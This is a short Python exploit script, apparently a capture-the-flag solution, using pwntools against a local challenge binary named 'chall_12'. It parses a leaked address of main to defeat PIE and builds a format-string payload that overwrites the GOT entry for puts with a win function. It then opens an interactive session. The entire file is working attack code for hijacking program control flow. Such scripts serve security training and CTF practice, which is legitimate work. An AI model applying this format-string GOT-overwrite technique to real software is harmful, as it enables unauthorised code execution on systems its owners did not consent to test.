#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_12')

p = process(binary.path)

p.recvuntil('Sometimes life gets hard, here\'s some help: ')
_ = p.recvline().strip()
main = int(_,16)
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

offset = 7
payload = fmtstr_payload(offset,{binary.got.puts:binary.sym.win})
p.sendline(payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])

p.interactive()
